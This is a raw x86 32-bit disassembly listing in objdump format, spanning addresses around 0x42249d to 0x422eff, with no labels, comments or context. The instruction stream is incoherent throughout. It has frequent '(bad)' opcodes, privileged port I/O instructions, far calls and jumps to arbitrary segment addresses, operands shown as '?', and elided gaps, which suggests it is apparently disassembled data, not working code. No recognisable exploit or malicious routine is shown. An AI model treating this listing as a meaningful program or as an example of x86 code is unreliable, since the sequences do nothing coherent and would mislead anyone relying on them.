  42249d:	jge    0x4224d3
  42249f:	xor    al,0xda
  4224a1:	retf   
  4224a2:	ss inc esi
  4224a4:	push   edi
  4224a5:	xor    dh,al
  4224a7:	das    
  4224a8:	mov    BYTE PTR [edx-0x1c],ch
  4224ab:	test   eax,0xe44374af
  4224b0:	mov    ds:0x4a0f5291,al
  4224b5:	jmp    0x422521
  4224b7:	pop    es
  4224b8:	and    edx,DWORD PTR [ebp+ebp*4-0x1a]
  4224bc:	outs   dx,BYTE PTR ds:[esi]
  4224bd:	add    cl,BYTE PTR [esi]
  4224bf:	cs lahf 
  4224c1:	mov    esi,0x46449eda
  4224c6:	inc    ebp
  4224c7:	push   ebx
  4224c8:	sub    BYTE PTR [ebp+0x2e496ff6],dh
  4224ce:	or     dh,BYTE PTR [ebp+0x24d84c3]
  4224d4:	pop    DWORD PTR ds:0x1fb33d02
  4224da:	aad    0xbf
  4224dc:	adc    BYTE PTR [edi],bl
  4224de:	ds pop eax
  4224e0:	or     esi,edx
  4224e2:	outs   dx,DWORD PTR ds:[esi]
  4224e3:	rcl    DWORD PTR [ecx],cl
  4224e5:	xchg   esi,eax
  4224e6:	shr    DWORD PTR [edi],0xc2
  4224e9:	pop    es
  4224ea:	pusha  
  4224eb:	ins    BYTE PTR es:[edi],dx
  4224ec:	inc    edx
  4224ed:	sbb    DWORD PTR [eax+edx*4-0x52],0x45
  4224f2:	push   ebp
  4224f3:	dec    ebp
  4224f4:	aaa    
  4224f5:	xor    BYTE PTR [ebx-0x4cf9cb4d],dh
  4224fb:	inc    eax
  4224fc:	rcr    BYTE PTR [ebp-0x5],1
  4224ff:	shr    BYTE PTR [ebp-0x78],1
  422502:	dec    esi
  422503:	adc    ch,ch
  422505:	(bad)  
  422506:	ss loope 0x4224d7
  422509:	fbld   TBYTE PTR [ebx+eax*2+0x47]
  42250d:	dec    ebx
  42250e:	mov    WORD PTR [ebp+0x11f7da74],cs
  422514:	add    DWORD PTR [ecx+0x71e0c83d],0x39
  42251b:	shl    eax,0x7c
  42251e:	cdq    
  42251f:	adc    al,0xff
  422521:	cmp    BYTE PTR [ecx],ah
  422523:	ror    DWORD PTR [ecx],1
  422525:	mov    ebx,0xbb0f85cb
  42252a:	xlat   BYTE PTR ds:[ebx]
  42252b:	into   
  42252c:	sbb    eax,0xa73feb43
  422531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422532:	mov    cl,0xa
  422534:	cwde   
  422535:	and    eax,0x1c491a59
  42253a:	cld    
  42253b:	loopne 0x422522
  42253d:	mov    ch,0xc5
  42253f:	push   ds
  422540:	arpl   cx,ax
  422542:	dec    ebp
  422543:	pop    edi
  422544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422545:	mov    ecx,0x80ad733b
  42254a:	lods   al,BYTE PTR ds:[esi]
  42254b:	push   esi
  42254c:	repz add al,0x35
  42254f:	imul   ecx,esi,0x5c
  422552:	arpl   WORD PTR [ebx+0xff0546d],ax
  422558:	ds push es
  42255a:	xchg   ebp,eax
  42255b:	jg     0x42255f
  42255d:	sub    al,bl
  42255f:	(bad)  
  422560:	pusha  
  422561:	mov    ebp,0x8842ed74
  422566:	mov    al,ds:0x77854a59
  42256b:	outs   dx,DWORD PTR ds:[esi]
  42256c:	ds out dx,eax
  42256e:	rol    ebx,1
  422570:	mul    DWORD PTR [eax-0x3dd9ba3a]
  422576:	dec    edi
  422577:	sub    ebp,DWORD PTR [esi-0x49]
  42257a:	nop
  42257b:	and    esp,edi
  42257d:	(bad)  [ebp-0x63]
  422580:	ror    DWORD PTR [ecx+0x1a],0x44
  422584:	addr16 leave 
  422586:	in     al,dx
  422587:	dec    ecx
  422588:	xchg   ebp,eax
  422589:	push   es
  42258a:	cld    
  42258b:	mov    ebx,ecx
  42258d:	mov    ebp,DWORD PTR [ecx+0x70]
	...
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx-0x62195d08]
  422602:	add    DWORD PTR [edx+0x16e44],0x4
  422609:	add    DWORD PTR [eax],eax
  42260b:	add    al,dl
  42260d:	xchg   esi,eax
  42260e:	hlt    
  42260f:	jp     0x4225b3
  422611:	ins    BYTE PTR es:[edi],dx
  422612:	and    DWORD PTR [edx+0xa],0x2f9b4490
  422619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42261a:	pop    edi
  42261b:	aad    0x26
  42261d:	loope  0x4225c8
  42261f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422620:	mov    ebx,0xc83eee0b
  422625:	ja     0x42263c
  422627:	shl    BYTE PTR [edi-0x21],0x77
  42262b:	jmp    DWORD PTR [eax-0x4b2a4b2a]
  422631:	mov    edx,DWORD PTR [edi+eiz*4]
  422634:	pop    ecx
  422635:	pop    edx
  422636:	inc    edx
  422637:	mov    eax,ds:0xfb3c90ca
  42263c:	stos   BYTE PTR es:[edi],al
  42263d:	lods   eax,DWORD PTR ds:[esi]
  42263e:	lea    edx,[esi+0x6d]
  422641:	mov    cx,0xf6d4
  422645:	cmp    edx,DWORD PTR [ebx+0x4e3db523]
  42264b:	into   
  42264c:	leave  
  42264d:	fistp  DWORD PTR gs:[ebx-0x23de5980]
  422654:	dec    esi
  422655:	jb     0x4225e0
  422657:	cmp    eax,0x7e66805f
  42265c:	xor    bh,BYTE PTR [edi-0x4c]
  42265f:	das    
  422660:	in     al,0xd9
  422662:	fdiv   DWORD PTR es:[ecx-0xade7d33]
  422669:	imul   ebp,DWORD PTR [esi],0xe6b3e31f
  42266f:	dec    esi
  422670:	imul   esi,ebx,0xffffffee
  422673:	loope  0x422675
  422675:	jmp    0x4226b5
  422677:	test   eax,0xd553ac0f
  42267c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42267d:	pop    es
  42267e:	les    esp,FWORD PTR [esi+0x15]
  422681:	mov    bl,0xa9
  422683:	in     al,dx
  422684:	inc    DWORD PTR [edx+eiz*2-0x72cb6e69]
  42268b:	shl    ah,cl
  42268d:	jo     0x42263d
  42268f:	pop    ds
  422690:	sbb    bh,BYTE PTR [eax]
  422692:	sbb    eax,0x6547b553
  422697:	inc    edi
  422698:	jb     0x4226d2
  42269a:	std    
  42269b:	inc    ebp
  42269c:	ret    
  42269d:	cmp    BYTE PTR [edi-0x4c],al
  4226a0:	(bad)  
  4226a1:	sbb    al,0x1f
  4226a3:	mov    ecx,0xb9aeff5b
  4226a8:	dec    esp
  4226a9:	add    bl,0x8d
  4226ac:	fwait
  4226ad:	repz inc eax
  4226af:	pushf  
  4226b0:	xchg   BYTE PTR [edx+0x8071f50],bh
  4226b6:	jae    0x4226c1
  4226b8:	in     eax,dx
  4226b9:	push   ebx
  4226ba:	test   eax,0x11419cd9
  4226bf:	inc    eax
  4226c0:	inc    eax
  4226c1:	dec    ebp
  4226c2:	lea    edi,[ebx+0x7bbbe84a]
  4226c8:	dec    edx
  4226c9:	sti    
  4226ca:	jno    0x422709
  4226cc:	jmp    0x4226e3
  4226ce:	mov    ebx,0x84944744
  4226d3:	adc    al,0xdb
  4226d5:	jne    0x422681
  4226d7:	pop    edx
  4226d8:	sbb    dh,BYTE PTR [esi+0x63802902]
  4226de:	cmp    al,0xea
  4226e0:	sub    ch,BYTE PTR [ecx+0x4f]
  4226e3:	mov    DWORD PTR [ebx-0x3f],ebx
  4226e6:	mov    dh,0x74
  4226e8:	xor    al,0x1
  4226ea:	jns    0x42271e
  4226ec:	jae    0x4226a6
  4226ee:	xchg   ecx,eax
  4226ef:	int    0x94
  4226f1:	cmp    eax,0xe12e6ec9
  4226f6:	push   ds
  4226f7:	add    al,0x74
  4226f9:	fcom   QWORD PTR es:[ebx]
  4226fc:	mov    fs,WORD PTR [eax+eax*1+0x35]
  422700:	es push eax
  422702:	in     al,0x46
  422704:	popa   
  422705:	ins    DWORD PTR es:[edi],dx
  422706:	add    dl,ch
  422708:	lock call 0xf5a3:0x5a65a1da
	...
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x587f01c8
  422781:	and    eax,0x6f4886f4
  422786:	add    DWORD PTR [eax],eax
  422788:	add    al,0x1
  42278a:	add    BYTE PTR [eax],al
  42278c:	xor    DWORD PTR [edx],0x934e15fc
  422792:	stos   BYTE PTR es:[edi],al
  422793:	cdq    
  422794:	stos   BYTE PTR es:[edi],al
  422795:	rcl    edx,1
  422797:	or     edi,DWORD PTR [edi+0x69]
  42279a:	cmp    BYTE PTR [ebp+0x1b8bbd92],0x6
  4227a1:	cs dec ebp
  4227a3:	mov    edi,0x627e34c8
  4227a8:	aaa    
  4227a9:	imul   BYTE PTR [eax-0x66af8a2e]
  4227af:	and    al,BYTE PTR [ecx-0x39]
  4227b2:	adc    dh,BYTE PTR [ebp-0x55]
  4227b5:	sub    eax,0xceaadd9e
  4227ba:	icebp  
  4227bb:	or     ebp,DWORD PTR [ebx+esi*8+0x6d30de8a]
  4227c2:	iret   
  4227c3:	dec    edi
  4227c4:	call   0x4b78093f
  4227c9:	and    bh,BYTE PTR [eax+0x11]
  4227cc:	cs dec ebp
  4227ce:	sub    DWORD PTR [edx-0x6e],0x6ff5a90a
  4227d5:	fdivr  DWORD PTR [ebx+0x59]
  4227d8:	jge    0x42278d
  4227da:	in     al,0x21
  4227dc:	mov    edx,0x58b19006
  4227e1:	cld    
  4227e2:	hlt    
  4227e3:	cs xchg ebx,eax
  4227e5:	aad    0x27
  4227e7:	cli    
  4227e8:	clc    
  4227e9:	lds    edx,FWORD PTR [ebx]
  4227eb:	mov    ds:0xd2223f22,eax
  4227f0:	in     eax,dx
  4227f1:	push   ds
  4227f2:	mov    ebp,0xac7b72f2
  4227f7:	and    BYTE PTR [edi+0x69],al
  4227fa:	pop    eax
  4227fb:	pusha  
  4227fc:	test   BYTE PTR [eax],bl
  4227fe:	xchg   esp,eax
  4227ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422800:	pusha  
  422801:	or     al,0x92
  422803:	push   ds
  422804:	fmulp  st(5),st
  422806:	ins    DWORD PTR es:[edi],dx
  422807:	out    0x6c,eax
  422809:	add    BYTE PTR [edx-0x47],dh
  42280c:	and    dh,dl
  42280e:	push   ebp
  42280f:	jae    0x4227aa
  422811:	cs pop esi
  422813:	mov    al,0xb3
  422815:	je     0x42280c
  422817:	jae    0x4227dc
  422819:	or     eax,edi
  42281b:	mov    ds:0x82154180,al
  422820:	jle    0x4227a3
  422822:	inc    edx
  422823:	pop    eax
  422824:	adc    BYTE PTR [edi+0x43ab42f3],bh
  42282a:	call   0xa651:0xb56d7c23
  422831:	xor    ebp,DWORD PTR [esi+0x386464c]
  422837:	push   esp
  422838:	xor    DWORD PTR [ebx+0x330b3c0a],edi
  42283e:	ins    BYTE PTR es:[edi],dx
  42283f:	popf   
  422840:	mov    dl,0x91
  422842:	sbb    ecx,DWORD PTR [ebp+0x38]
  422845:	jl     0x42289f
  422847:	ret    
  422848:	fadd   DWORD PTR [edi+eiz*4+0x61]
  42284c:	or     esp,DWORD PTR [edi+eax*4-0x2c]
  422850:	pop    ebx
  422851:	in     al,dx
  422852:	std    
  422853:	xchg   esp,eax
  422854:	ja     0x422867
  422856:	pop    eax
  422857:	push   0xffffffa0
  422859:	stc    
  42285a:	xor    esi,ebx
  42285c:	mov    ds:0x656d7620,eax
  422861:	dec    eax
  422862:	dec    edx
  422863:	inc    esi
  422864:	cmp    al,0xe9
  422866:	inc    eax
  422867:	ret    
  422868:	outs   dx,DWORD PTR ds:[esi]
  422869:	pop    edi
  42286a:	rcl    BYTE PTR [ecx],cl
  42286c:	mov    esi,0xb85d2060
  422871:	ret    0xf94e
  422874:	push   edx
  422875:	and    ecx,DWORD PTR [esi]
  422877:	xchg   ebp,eax
  422878:	lock loop 0x4228c0
  42287b:	dec    esp
  42287c:	popf   
  42287d:	add    eax,0xf214d1d7
  422882:	xchg   esi,eax
  422883:	dec    esp
  422884:	(bad)  
  422885:	inc    eax
  422886:	dec    ebp
  422887:	mov    ds:0xdaa3e86b,al
  42288c:	cld    
  42288d:	inc    edi
  42288e:	fild   WORD PTR cs:[eax]
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422885
  422901:	iret   
  422902:	int    0xb9
  422904:	dec    esp
  422905:	jo     0x422908
  422907:	add    BYTE PTR [ecx+eax*1],al
  42290a:	add    BYTE PTR [eax],al
  42290c:	mov    edi,0x7380e4df
  422911:	mov    dl,0xb9
  422913:	mov    esi,0xebe9a2cb
  422918:	xor    al,0x67
  42291b:	(bad)  
  42291c:	scas   al,BYTE PTR es:[edi]
  42291d:	xor    ecx,0xbd732048
  422923:	iret   
  422924:	ds and dl,al
  422927:	jb     0x4229a0
  422929:	ja     0x422937
  42292b:	scas   al,BYTE PTR es:[edi]
  42292c:	into   
  42292d:	lea    edi,[ebp+0x23daaf44]
  422933:	pop    edx
  422934:	mov    al,0x75
  422936:	dec    eax
  422937:	and    al,0x2f
  422939:	sti    
  42293a:	arpl   WORD PTR [esi+0x199fc2],dx
  422940:	or     al,0x23
  422942:	arpl   WORD PTR [edx+0x15d0783f],si
  422948:	push   eax
  422949:	clc    
  42294a:	dec    eax
  42294b:	fsubr  st,st(2)
  42294d:	test   al,0x1f
  42294f:	cld    
  422950:	in     eax,dx
  422951:	xchg   DWORD PTR [edx],edi
  422953:	xor    esi,DWORD PTR [edi]
  422955:	jmp    0x4640688
  42295a:	adc    al,0x8
  42295c:	not    DWORD PTR [ecx-0x25]
  42295f:	mov    edi,0x8c92285c
  422964:	add    DWORD PTR [edx-0x80],edx
  422967:	aas    
  422968:	clc    
  422969:	sti    
  42296a:	add    eax,DWORD PTR [ecx]
  42296c:	in     eax,dx
  42296d:	arpl   si,ax
  42296f:	mov    dh,0x6f
  422971:	mov    ebx,ebp
  422973:	mov    cl,0x10
  422975:	xchg   DWORD PTR [esi+0x4f86ab0],ecx
  42297b:	outs   dx,DWORD PTR ds:[esi]
  42297c:	and    al,0x98
  42297e:	sbb    eax,0xe25214d7
  422983:	dec    ebp
  422984:	mov    ebx,esi
  422986:	dec    esp
  422987:	xchg   ebp,esp
  422989:	lahf   
  42298a:	xchg   ebx,eax
  42298b:	inc    eax
  42298c:	inc    esp
  42298d:	enter  0xab64,0x2d
  422991:	pusha  
  422992:	frstor [ebp-0x2a5649d9]
  422998:	push   edi
  422999:	or     edi,DWORD PTR [edx+0x261ad2e9]
  42299f:	pop    es
  4229a0:	cld    
  4229a1:	cld    
  4229a2:	rcr    BYTE PTR [eax-0x53e60558],0xcf
  4229a9:	mov    al,ds:0x532f98a2
  4229ae:	xor    al,0xc8
  4229b0:	mov    ds:0x72811e2,al
  4229b5:	sbb    al,0xc0
  4229b7:	push   es
  4229b8:	aam    0xde
  4229ba:	pusha  
  4229bb:	mov    bl,BYTE PTR [edx+0x39]
  4229be:	and    dh,ch
  4229c0:	mov    ch,0x7e
  4229c2:	xchg   ch,al
  4229c4:	loop   0x4229e0
  4229c6:	dec    ebx
  4229c7:	and    BYTE PTR [ecx-0x5a],0x81
  4229cb:	push   ds
  4229cc:	ret    
  4229cd:	popf   
  4229ce:	mov    ch,0x64
  4229d0:	xor    eax,0xfef4fda4
  4229d5:	sub    DWORD PTR [edi-0x19],ecx
  4229d8:	cmp    DWORD PTR [ebx+0x5b],ebp
  4229db:	(bad)  
  4229dc:	out    dx,al
  4229dd:	stos   DWORD PTR es:[edi],eax
  4229de:	mov    dh,0x64
  4229e0:	pop    es
  4229e1:	popa   
  4229e2:	lea    esp,[esi]
  4229e4:	cld    
  4229e5:	add    eax,0xb7fbb9af
  4229ea:	jno    0x422a64
  4229ec:	inc    esi
  4229ed:	jle    0x422a11
  4229ef:	inc    eax
  4229f0:	jb     0x422a39
  4229f2:	pop    ebx
  4229f3:	adc    al,0xf3
  4229f5:	(bad)  
  4229f7:	lods   eax,DWORD PTR ds:[esi]
  4229f8:	xchg   cl,ah
  4229fa:	mov    dh,0x1b
  4229fc:	dec    edx
  4229fd:	mov    ch,bh
  4229ff:	sub    BYTE PTR [edi-0x61c05bc5],bh
  422a05:	and    DWORD PTR [edx+0x52],esi
  422a08:	outs   dx,DWORD PTR ds:[esi]
  422a09:	int3   
  422a0a:	mov    ds:0x32fd7335,eax
  422a0f:	mov    edi,0x0
	...
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	leave  
  422a81:	ja     0x422b02
  422a83:	mov    esp,0x17150
  422a88:	add    al,0x1
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	leave  
  422a8d:	retf   
  422a8e:	inc    ebp
  422a8f:	jmp    0x7627:0xf783d5d9
  422a96:	cmp    eax,DWORD PTR [eax-0x22fda1a4]
  422a9c:	ins    DWORD PTR es:[edi],dx
  422a9d:	leave  
  422a9e:	mov    ds:0x2475f3d8,eax
  422aa3:	adc    cl,al
  422aa5:	jns    0x422a57
  422aa7:	in     al,dx
  422aa8:	adc    al,0xb
  422aaa:	daa    
  422aab:	xchg   DWORD PTR [ecx],esi
  422aad:	rcl    DWORD PTR [esi-0x9],0x46
  422ab1:	dec    ebx
  422ab2:	cmp    ecx,DWORD PTR [ebx-0x5b]
  422ab5:	inc    ebx
  422ab6:	sar    DWORD PTR [ebx+eax*4],1
  422ab9:	xchg   esp,eax
  422aba:	jg     0x422abb
  422abc:	fbstp  TBYTE PTR [ebp+ecx*4+0x758de0dc]
  422ac3:	inc    edx
  422ac4:	xor    ecx,esp
  422ac6:	xchg   edi,eax
  422ac7:	push   edx
  422ac8:	mov    edx,0x452ae7ca
  422acd:	push   ebx
  422ace:	xchg   ecx,eax
  422acf:	hlt    
  422ad0:	lock cwde 
  422ad2:	or     eax,0x10f8389c
  422ad7:	sub    BYTE PTR [edi-0x5c447805],ah
  422add:	pop    edx
  422ade:	inc    ebp
  422adf:	sbb    DWORD PTR [ecx],esp
  422ae1:	xor    DWORD PTR [esi+ecx*1],0xa20a1f4b
  422ae8:	adc    eax,0xb14ea3c6
  422aed:	pop    edx
  422aee:	or     esi,edi
  422af0:	lea    esp,[edx+0x21]
  422af3:	push   ebx
  422af4:	sbb    al,BYTE PTR [edi+0x25]
  422af7:	retf   
  422af8:	jns    0x422b6b
  422afa:	push   0x52
  422afc:	pop    esi
  422afd:	jnp    0x422b1a
  422aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b00:	mov    edx,0x7b78fb12
  422b05:	arpl   WORD PTR [esi+0x2e73c05b],si
  422b0b:	pop    ebp
  422b0c:	std    
  422b0d:	into   
  422b0e:	data16 adc al,0x43
  422b11:	fs dec ebp
  422b13:	(bad)  
  422b14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b16:	push   ecx
  422b17:	das    
  422b18:	cwde   
  422b19:	call   0x3b76:0xf8c94249
  422b20:	dec    eax
  422b21:	(bad)  
  422b22:	fdiv   QWORD PTR [ebx+0x7a]
  422b25:	out    0x20,al
  422b27:	out    0x58,al
  422b29:	jno    0x422ba4
  422b2b:	ins    BYTE PTR es:[edi],dx
  422b2c:	xchg   esi,eax
  422b2d:	out    0x51,eax
  422b2f:	loope  0x422ae8
  422b31:	mov    WORD PTR [esi],ds
  422b33:	mov    esp,0x19a863e9
  422b38:	push   edi
  422b39:	fs ins BYTE PTR es:[edi],dx
  422b3b:	cmp    al,0x1e
  422b3d:	push   esi
  422b3e:	jmp    0x422ac2
  422b40:	cmp    esi,DWORD PTR [edi]
  422b42:	cwde   
  422b43:	push   ss
  422b44:	xor    dl,cl
  422b46:	mov    bl,0x96
  422b48:	out    0x4f,al
  422b4a:	push   ebx
  422b4b:	pushf  
  422b4c:	in     eax,dx
  422b4d:	or     eax,0x976b805
  422b52:	jmp    0xd47a:0x67acc306
  422b59:	test   eax,0x1b61ef55
  422b5e:	(bad)  
  422b5f:	cld    
  422b60:	cmp    BYTE PTR [ebx-0x41],ch
  422b63:	sahf   
  422b64:	mov    eax,ds:0x2016c85a
  422b69:	adc    edi,ebp
  422b6b:	into   
  422b6c:	imul   ebp,DWORD PTR [edi-0x7a2d558],0xffffffdf
  422b73:	jns    0x422bb4
  422b75:	or     esi,ebp
  422b77:	sahf   
  422b78:	cmc    
  422b79:	out    dx,eax
  422b7a:	popa   
  422b7b:	loope  0x422bae
  422b7d:	mov    dl,0x77
  422b7f:	push   esp
  422b80:	mov    edx,0x944a72dc
  422b85:	cwde   
  422b86:	out    0x5,al
  422b88:	pop    ss
  422b89:	sti    
  422b8a:	cmp    al,0xa4
  422b8c:	mov    esi,0xada18f
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x2407b264]
  422c02:	in     al,0x54
  422c04:	push   esp
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR [ecx+eax*1],al
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	in     eax,0x5e
  422c0e:	nop
  422c0f:	pop    es
  422c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c11:	push   esp
  422c12:	adc    BYTE PTR [edi-0x1f],dl
  422c15:	jne    0x422bff
  422c17:	lds    edi,FWORD PTR [ecx-0x20]
  422c1a:	out    0xec,al
  422c1c:	xchg   al,cl
  422c1e:	mov    WORD PTR [eax+0x6f],?
  422c21:	sub    edi,ebx
  422c23:	shr    ebx,0xee
  422c26:	sub    DWORD PTR [ecx-0x547f03ed],ecx
  422c2c:	mov    cl,0x77
  422c2e:	jge    0x422c73
  422c30:	sti    
  422c31:	jle    0x422c2b
  422c33:	adc    BYTE PTR [eax-0xddcd428],dl
  422c39:	mov    ah,0x88
  422c3b:	lahf   
  422c3c:	loope  0x422bc4
  422c3e:	shl    BYTE PTR [ecx-0x36599e96],cl
  422c44:	push   ecx
  422c45:	data16 and ah,cl
  422c48:	or     esi,edi
  422c4a:	add    DWORD PTR [edi],eax
  422c4c:	xchg   esi,eax
  422c4d:	je     0x422bd2
  422c4f:	or     bh,BYTE PTR [edx+0x43]
  422c52:	pop    DWORD PTR [ebx-0x76841ad6]
  422c58:	mov    WORD PTR [esi+ebx*1],?
  422c5b:	jmp    0x422c19
  422c5d:	sbb    BYTE PTR [ecx*4+0x567c3b44],ah
  422c64:	aaa    
  422c65:	cmp    BYTE PTR [edx-0x1e4295cc],dh
  422c6b:	and    al,0x6f
  422c6d:	sub    DWORD PTR [ebx],ebp
  422c6f:	stos   DWORD PTR es:[edi],eax
  422c70:	pusha  
  422c71:	pop    edx
  422c72:	add    al,0x9b
  422c74:	adc    edx,DWORD PTR [edx*2+0x6fce636b]
  422c7b:	aas    
  422c7c:	dec    ebp
  422c7d:	xlat   BYTE PTR ds:[ebx]
  422c7e:	lea    esi,[ebx+0xd]
  422c81:	out    dx,al
  422c82:	or     BYTE PTR [esi],dl
  422c84:	inc    esp
  422c85:	mov    WORD PTR [ebp+0x62],cs
  422c88:	cdq    
  422c89:	pop    esp
  422c8a:	call   0x663f:0xbfa1cdff
  422c91:	not    DWORD PTR [edx-0x59e5a15e]
  422c97:	(bad)  
  422c98:	xchg   ecx,eax
  422c99:	xor    BYTE PTR [eax+0x11f400a2],0xac
  422ca0:	gs dec ebp
  422ca2:	pavgb  mm4,mm6
  422ca5:	sub    eax,ebx
  422ca7:	xor    eax,0x8245497c
  422cac:	push   esp
  422cad:	mov    edx,0x187484b4
  422cb2:	jecxz  0x422cb8
  422cb4:	push   0x5e
  422cb6:	sbb    dh,dh
  422cb8:	mov    ah,0x7c
  422cba:	sahf   
  422cbb:	push   ds
  422cbc:	ja     0x422d21
  422cbe:	push   edx
  422cbf:	inc    ecx
  422cc0:	in     al,dx
  422cc1:	mov    esi,0x8eea8c3
  422cc6:	sub    DWORD PTR [eax],esi
  422cc8:	and    eax,0x33ade0c2
  422ccd:	in     al,dx
  422cce:	push   esp
  422ccf:	and    ecx,DWORD PTR [ebx]
  422cd1:	outs   dx,BYTE PTR ds:[esi]
  422cd2:	ds dec eax
  422cd4:	cwde   
  422cd5:	retf   
  422cd6:	xor    al,0xe2
  422cd8:	aas    
  422cd9:	popa   
  422cda:	retf   
  422cdb:	repnz fadd st,st(3)
  422cde:	fcomp  st(4)
  422ce0:	xor    al,0x87
  422ce2:	inc    esi
  422ce3:	js     0x422d60
  422ce5:	mov    ecx,eax
  422ce7:	ja     0x422cff
  422ce9:	inc    esp
  422cea:	sbb    BYTE PTR [edi+eax*2+0x6b87a15a],0xb5
  422cf2:	mov    dl,0x70
  422cf4:	and    al,0xeb
  422cf6:	sti    
  422cf7:	sbb    bh,cl
  422cf9:	adc    BYTE PTR [eax-0x1b0c41d0],dl
  422cff:	xlat   BYTE PTR ds:[ebx]
  422d00:	adc    BYTE PTR [esi+0x25bd132e],bh
  422d06:	imul   esi,DWORD PTR [ebp-0x2eb4a21e],0xffffffdc
  422d0d:	pop    esp
  422d0e:	adc    edx,DWORD PTR [ebp+0x0]
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    ecx,DWORD PTR [ebp-0x77]
  422d82:	or     edx,0x17358
  422d88:	add    al,0x1
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	lods   eax,DWORD PTR gs:[esi]
  422d8e:	xchg   ebx,eax
  422d8f:	daa    
  422d90:	in     eax,dx
  422d91:	test   eax,0x5cd8ceb4
  422d96:	mov    cl,0x3f
  422d98:	jae    0x422d1f
  422d9a:	sub    BYTE PTR [ecx-0x51c990a5],ah
  422da0:	popw   ds
  422da2:	inc    esi
  422da3:	sub    eax,0x653a3e52
  422da8:	jge    0x422e0a
  422daa:	lahf   
  422dab:	pop    ds
  422dac:	sub    edi,DWORD PTR [edx+0x15]
  422daf:	es popa 
  422db1:	mov    bl,0xb
  422db3:	jmp    0x422e22
  422db5:	in     eax,0xf8
  422db7:	dec    ebp
  422db8:	mov    ds:0x42831dff,eax
  422dbd:	pop    ss
  422dbe:	out    0x2c,eax
  422dc0:	push   0xd1ccfd91
  422dc5:	dec    edi
  422dc6:	test   eax,0x84d09146
  422dcb:	fsubp  st(5),st
  422dcd:	cmc    
  422dce:	sbb    DWORD PTR [edx+0x53],0xf886f530
  422dd5:	sahf   
  422dd6:	retf   
  422dd7:	outs   dx,BYTE PTR ds:[esi]
  422dd8:	cwde   
  422dd9:	xor    dh,BYTE PTR [esi]
  422ddb:	sbb    eax,0x7edc26d8
  422de0:	ds je  0x422dc6
  422de3:	cs icebp 
  422de5:	out    dx,eax
  422de6:	ins    DWORD PTR es:[edi],dx
  422de7:	ret    0xb579
  422dea:	out    dx,al
  422deb:	xor    BYTE PTR [ebx-0x537ce8a6],dh
  422df1:	daa    
  422df2:	or     eax,0xde29fcf7
  422df7:	pushf  
  422df8:	pop    esi
  422df9:	inc    esi
  422dfa:	fcomip st,st(6)
  422dfc:	jb     0x422de8
  422dfe:	adc    BYTE PTR [esi+0x8],bh
  422e01:	xchg   edi,eax
  422e02:	jp     0x422ddb
  422e04:	(bad)  
  422e05:	push   esi
  422e06:	dec    ecx
  422e07:	pop    ss
  422e08:	cmc    
  422e09:	mov    ecx,0xec885f03
  422e0e:	retf   0xd1f1
  422e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e12:	cs sub eax,0xbc1a627e
  422e18:	rcr    BYTE PTR [ebx],cl
  422e1a:	inc    esp
  422e1b:	adc    BYTE PTR [ebx],dh
  422e1d:	not    BYTE PTR [esp+esi*8]
  422e20:	jmp    0x422dd4
  422e22:	or     DWORD PTR [edx-0x72],0x31b31eee
  422e29:	fisttp WORD PTR [ecx+0x19ef000e]
  422e2f:	or     ebx,DWORD PTR [esi+0x49]
  422e32:	shl    BYTE PTR [esi+0x7183e7cf],1
  422e38:	imul   edi,DWORD PTR [edx-0x10],0xa268756a
  422e3f:	ret    0x1d6
  422e42:	aam    0xe8
  422e44:	iret   
  422e45:	pop    esp
  422e46:	lods   al,BYTE PTR ds:[esi]
  422e47:	dec    eax
  422e48:	add    al,BYTE PTR [ecx-0x625a9b24]
  422e4e:	dec    DWORD PTR [ecx+eax*8]
  422e51:	pop    ecx
  422e52:	push   edi
  422e53:	int3   
  422e54:	mov    esp,0x93a5064b
  422e59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e5a:	ret    0x3152
  422e5d:	and    BYTE PTR [ebx],cl
  422e5f:	cwde   
  422e60:	call   0x2bf6:0x1c9db91b
  422e67:	jo     0x422ed0
  422e69:	mov    ebx,0x7f9f05c0
  422e6f:	push   0x686ff4c6
  422e74:	cmp    eax,0x59fd59d1
  422e79:	push   edi
  422e7a:	lahf   
  422e7b:	repnz retf 
  422e7d:	test   eax,0x9ee3fa5c
  422e82:	sub    al,0xd6
  422e84:	mov    ebx,0x417e30c6
  422e89:	jp     0x422ea5
  422e8b:	fst    DWORD PTR [edx+0xd0f684]
	...
  422ef1:	add    BYTE PTR [eax],al
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0xf84b
